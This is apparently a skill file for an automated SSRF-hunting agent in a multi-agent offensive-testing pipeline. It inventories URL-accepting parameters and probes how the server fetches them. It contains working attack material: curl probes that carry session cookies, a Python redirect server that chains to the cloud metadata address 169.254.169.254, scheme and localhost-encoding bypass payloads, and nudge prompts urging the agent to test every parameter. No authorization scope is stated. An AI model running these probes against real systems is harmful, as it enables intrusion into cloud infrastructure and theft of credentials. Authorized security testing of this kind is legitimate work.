---
name: ssrf_primitive_map
agent: agent7_ssrf
description: Inventory every URL-accepting input and map the server's redirect-fetching behavior to find SSRF primitives.
---

# SSRF Primitive Map

## Purpose

Server-Side Request Forgery starts where the server agrees to fetch a URL you control. This skill maps **every** URL-accepting input on the target — webhook fields, avatar/profile-image URLs, link-preview endpoints, importers (OPML/CSV/vCard feeds), PDF/invoice generators, SAML/SSO `RelayState` fetchers, email-template renderers, favicon fetchers, oEmbed proxies, image-proxy/resize endpoints — and then determines, for each one, the server's exact fetch behavior: does it follow redirects, how many hops, which schemes, does it resolve DNS at request time, does it leak the response or only timing. It finds the primitive. The ladder skills (`cloud_metadata_oracle`, `k8s_metadata_ladder`, `internal_port_scan`, `file_read_via_ssrf`) turn primitives into impact.

## Division of labor

- **Consumes:** `recon/js_endpoints.txt` (agent1: endpoints + params harvested from JS bundles); `findings/params_inventory.csv` (agent2: every parameter per endpoint with guessed type); `techstack/fingerprint.md` (agent3: framework/WAF/CDN, because e.g. Next.js `/api/image` proxies and Rails `open-uri` behave differently)
- **Produces:** the finished artifact — `findings/ssrf_primitive_map.md`: one row per URL-accepting input with: endpoint, parameter, feature name, accepts-URL evidence, redirect-follow behavior, scheme handling, response-leak vs blind, SSRF confidence score, verdict

## When to use / when NOT to use

- **Use when:** any endpoint/parameter accepts a URL, domain, webhook callback, image URL, import/feed URL, or "fetch this for me" semantics; when a feature generates PDFs, screenshots, thumbnails, link previews, or unfurls; when JS shows `fetch(`/proxy?url=`)`-style helpers; when you see avatar-by-URL, "import from URL", or notification-webhook settings
- **Skip when (time-pass filter):** the URL is only stored and never fetched (check: supply a collaborator URL and watch for the hit — no hit after 10 minutes of feature use = stored-not-fetched); the fetcher runs client-side only (JS `new Image()` / `fetch()` in browser — confirm in browser devtools network tab); the URL is validated to an allowlist of domains you cannot bypass (document the allowlist, mark NEGATIVE, move on). Ask: does it leak? Only proceed if the server actually makes the outbound request.

## Methodology

1. **Assemble the candidate list.** From `params_inventory.csv` and `js_endpoints.txt`, list every parameter whose name, example value, or UI label suggests a URL: `url`, `link`, `webhook`, `callback`, `avatar_url`, `image`, `picture`, `feed`, `import_url`, `file`, `src`, `redirect`, `next`, `proxy`, `fetch`, `uri`, `endpoint`, `target`, `site`, `domain`, `preview`. Also list **features** (not params) that imply fetching: link unfurling in chat, "upload by URL", invoice/PDF export, scheduled reports emailed as PDF, SAML metadata import, RSS/OPML import, social-login avatar sync.
2. **Baseline the app normally first.** For each candidate, perform the feature's normal happy-path with a benign public URL (`https://example.com/`). Record status code, response body, and timing. This is your behavioral baseline — every later anomaly is measured against it.
3. **Deploy your collaborator.** Use your own out-of-band listener: Burp Collaborator, interactsh, or a VPS running `python3 -m http.server` + logging, or `nc -lvp`. Placeholder `<COLLAB>` = your collaborator hostname (e.g. `xyz123.oastify.com` or `198.51.100.7:8080`). Verify the collaborator is reachable from the public internet before testing.
4. **Probe each candidate with the collaborator URL.** Submit `<COLLAB>` (and `https://<COLLAB>/probe/<candidate-name>` for attribution). Do this ONE candidate at a time so hits are attributable. Wait 60–120 seconds, then check the collaborator log for an inbound hit. Note: User-Agent, source IP/ASN, Host header, path requested.
5. **Classify hit vs stored.** If you get a hit, the server fetches. Record the fetcher's User-Agent — `wkhtmltopdf`, `HeadlessChrome`, `python-requests`, `Java`, `curl`, `Go-http-client` each tell you the fetch stack, which predicts which tricks work (e.g. `python-requests` follows redirects by default; `Java` `HttpURLConnection` does not follow POST→redirect without code).
6. **Test redirect-following (the critical differential).** Point the parameter at `https://<COLLAB>/redir1`, where your collaborator returns `302 → https://<COLLAB>/redir2`, which returns `302 → https://169.254.169.254/latest/meta-data/`. Does the final metadata request arrive? Test: single 302, 301, 307, 308, meta-refresh, and JavaScript redirect (`window.location`). Many SSRF filters validate only the *initial* URL and follow redirects blindly — this is the single highest-yield SSRF differential.
7. **Test scheme handling.** For each fetcher, try `file:///etc/hostname`, `gopher://<COLLAB>/x`, `dict://<COLLAB>/x`, `ftp://<COLLAB>/x`, `jar:file://`, `netdoc://`, `php://filter/convert.base64-encode/resource=index.php`. Most will be rejected — record *how* they fail (error message text is an oracle: "scheme not allowed" vs "failed to fetch" vs timeout reveals the parser).
8. **Test DNS-resolution timing.** Submit `http://<unique-subdomain>.<COLLAB>/` where the subdomain does not exist (NXDOMAIN). Then submit a valid one. Compare: does the server distinguish NXDOMAIN from connection-refused from timeout in its error message or timing? This calibrates your oracle for `internal_port_scan`.
9. **Test IP-literal handling.** Try `http://2130706433/` (decimal for 127.0.0.1), `http://0x7f.0x0.0x0.0x1/`, `http://0177.0.0.1/`, `http://127.1/`, `http://[::ffff:127.0.0.1]/`. Some validators parse the *string* with a blocklist (`127.0.0.1`, `169.254.169.254`) but the *fetcher* resolves the encoded form. Record which encodings reach your collaborator unchanged vs get normalized.
10. **Test response reflection vs blind.** After the fetch, does any part of the fetched content come back to you? Indicators: the fetched page's `<title>` in a "preview", image dimensions, HTTP status of the fetch, content-length, or the collaborator-echoed marker. Fully-blind primitives are still exploitable (timing oracles, metadata exfiltration to your server) but change the ladder strategy — record which it is.
11. **Test authentication/headers the fetcher sends.** Have your collaborator require no auth but log all headers. Does the fetcher forward the victim's cookies/Authorization? Does it send a distinctive internal header (`X-Internal-Secret`)? Leaked internal headers in the fetcher = extra impact.
12. **Test method and body control.** Can you influence the HTTP method (some importers let you pick POST with a body)? A primitive that lets you POST attacker-controlled bodies to internal endpoints is request-smuggling-adjacent and far more powerful — escalate to `request_smuggling` skill.
13. **Map the redirect chain limit.** Chain 1→2→3→4→5 redirects on your collaborator. How many hops does the fetcher follow before giving up? Record the exact count — deep chains are needed when the filter validates hop 1 but you need hop 4 to land on metadata.
14. **Check for SSRF via second-order paths.** Some primitives don't fetch on submit — they fetch on *render*: email templates rendered when an admin views them, avatars fetched when another user views your profile, scheduled reports. For each candidate, trigger all downstream renders (view profile as another user, trigger the scheduled job if possible) and watch the collaborator for delayed hits up to 15 minutes.
15. **Score and verdict each primitive.** Score 0–5: fetches (1), follows redirects (1), reaches link-local/metadata (1), reflects response or timing oracle (1), bypasses naive blocklist (1). Verdict CONFIRMED at ≥3 with raw evidence; 1–2 = handoff candidate for `dns_rebinding` / `redirect_chain_abuse`.
16. **Write the map.** One table row per candidate, including the NEGATIVE ones (endpoint, param, result, why dead). NEGATIVEs prevent re-testing and are themselves deliverable.

## Exact commands

Baseline happy-path (replace `<TARGET>` with scheme+host, e.g. `https://app.example.com`):

```bash
# 1. Baseline: normal avatar-by-URL with a benign URL, capture timing + body
curl -s -o /tmp/base_body.txt -w 'code=%{http_code} time=%{time_total}s\n' \
  -X POST '<TARGET>/api/profile' \
  -H 'Content-Type: application/json' \
  -H "Cookie: <SESSION_COOKIE>" \
  -d '{"avatar_url":"https://example.com/"}'
cat /tmp/base_body.txt
```

Collaborator probe (one candidate at a time for attribution):

```bash
# 2. Probe: submit collaborator URL, tagged per candidate
curl -s -o /tmp/probe_body.txt -w 'code=%{http_code} time=%{time_total}s\n' \
  -X POST '<TARGET>/api/profile' \
  -H 'Content-Type: application/json' \
  -H "Cookie: <SESSION_COOKIE>" \
  -d '{"avatar_url":"https://<COLLAB>/probe/avatar_url"}'
cat /tmp/probe_body.txt
# then check collaborator log for an inbound hit within 120s
```

Redirect-chain differential (collaborator must serve the chain; minimal python):

```python
# 3. collaborator redirect chain: /r1 ->302 /r2 ->302 /r3 ->302 http://169.254.169.254/latest/meta-data/
# save as /tmp/redir.py on YOUR server, run: python3 /tmp/redir.py 8080
from http.server import BaseHTTPRequestHandler, HTTPServer
import sys
CHAIN = {"/r1": "/r2", "/r2": "/r3", "/r3": "http://169.254.169.254/latest/meta-data/"}
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        print(f"HIT {self.path} UA={self.headers.get('User-Agent')} FROM={self.client_address[0]}", flush=True)
        if self.path in CHAIN:
            self.send_response(302); self.send_header("Location", CHAIN[self.path]); self.end_headers()
        else:
            self.send_response(200); self.end_headers(); self.wfile.write(b"END")
    def log_message(self, *a): pass
HTTPServer(("0.0.0.0", int(sys.argv[1])), H).serve_forever()
```

```bash
# 4. Point the primitive at the chain head and watch YOUR server log for the metadata hop
curl -s -X POST '<TARGET>/api/profile' -H 'Content-Type: application/json' \
  -H "Cookie: <SESSION_COOKIE>" \
  -d '{"avatar_url":"http://<YOUR_SERVER>:8080/r1"}'
# If your log shows a request to 169.254.169.254 from the TARGET's IP, the filter is redirect-blind.
```

Scheme and encoding probes:

```bash
# 5. Scheme battery (expect rejections; record exact error text per scheme)
for s in 'file:///etc/hostname' 'gopher://<COLLAB>/x' 'dict://<COLLAB>/x' 'ftp://<COLLAB>/x' \
         'http://2130706433/' 'http://0x7f.0x0.0x0.0x1/' 'http://0177.0.0.1/' 'http://127.1/' 'http://[::ffff:127.0.0.1]/'; do
  echo "=== $s"
  curl -s -m 20 -o /dev/null -w 'code=%{http_code} time=%{time_total}s\n' \
    -X POST '<TARGET>/api/profile' -H 'Content-Type: application/json' \
    -H "Cookie: <SESSION_COOKIE>" \
    -d "{\"avatar_url\":\"$s\"}"
done
```

DNS oracle calibration:

```bash
# 6. NXDOMAIN vs valid: compare error/timing to calibrate the oracle
curl -s -m 25 -w '\ncode=%{http_code} time=%{time_total}s\n' -X POST '<TARGET>/api/profile' \
  -H 'Content-Type: application/json' -H "Cookie: <SESSION_COOKIE>" \
  -d '{"avatar_url":"http://nx-<RANDOM>.example.invalid/"}'
```

## Completion-bias defenses

- [ ] Candidate list built from BOTH params_inventory.csv AND js_endpoints.txt (not just one source)
- [ ] Every candidate probed with collaborator URL, one at a time, hits attributed
- [ ] Redirect-chain test run (302, 301, 307, 308, meta-refresh) per fetching primitive
- [ ] Scheme battery run per fetcher (file/gopher/dict/ftp + IP encodings)
- [ ] DNS oracle calibrated (NXDOMAIN vs valid vs timeout baselines recorded)
- [ ] Response-reflection vs blind classification recorded per primitive
- [ ] Second-order/delayed fetch paths checked (profile views, scheduled jobs, email renders)
- [ ] Redirect hop-limit measured (how many hops before the fetcher stops)
- [ ] NEGATIVE candidates documented with the reason (stored-not-fetched / client-side / allowlisted)
- [ ] findings/ssrf_primitive_map.md written with the full table

- **Review step:** agent10_review must verify: (a) collaborator hits are from the target's ASN/IP, not the agent's own requests; (b) every CONFIRMED primitive has the raw request/response pair saved; (c) the redirect-follow claim was tested with a live chain, not inferred; (d) no candidate from the inventory was skipped without a NEGATIVE verdict.
- **Nudge prompts:**
  - "Keep going until every URL-suggesting parameter in the inventory has a row in the map — the primitive is usually the 14th parameter, not the 1st."
  - "Do not report done before you have tested redirect-following. A filter that validates the initial URL but follows redirects is the most common real SSRF."
  - "If a feature stores the URL without fetching on submit, trigger every downstream render before marking it NEGATIVE."
- **Finished artifact definition:** `findings/ssrf_primitive_map.md` exists on disk with one table row per candidate (endpoint, parameter, feature, accepts-URL evidence, redirect behavior, scheme handling, reflection-vs-blind, score, verdict) plus raw request/response pairs for every CONFIRMED primitive in `findings/raw/ssrf_primitive_map/`.

## Evidence standard

- Baseline: every probe compared against the benign-URL happy-path on the same endpoint (status, body, timing)
- Reproduction: 2x independent reproduction required — the collaborator hit must arrive twice, from two separate submissions, with distinct attribution tags
- Raw evidence: full request/response pairs saved; collaborator log lines (timestamp, source IP, User-Agent, path) pasted into the artifact
- Verdicts: CONFIRMED (fetches + redirect/scheme behavior proven with raw pairs) / INCONCLUSIVE (hit seen once, or fetcher identity unclear — needs a second model run) / NEGATIVE (stored-not-fetched, client-side-only, or hard allowlist, with the proof)

## Handoffs

- `cloud_metadata_oracle`: consumes the CONFIRMED primitives list — only primitives scoring ≥3 get metadata attempts
- `redirect_chain_abuse`: consumes primitives where the filter validated the initial URL but followed redirects (or where follow-behavior is unknown)
- `webhook_ssrf`: consumes webhook/callback-typed primitives for response-reflection and timing-oracle work
- `render_pipeline_ssrf`: consumes PDF/screenshot/preview-typed primitives
- `internal_port_scan`: consumes blind primitives with a calibrated DNS/timing oracle
- agent10_review: consumes `findings/ssrf_primitive_map.md` for the review gate
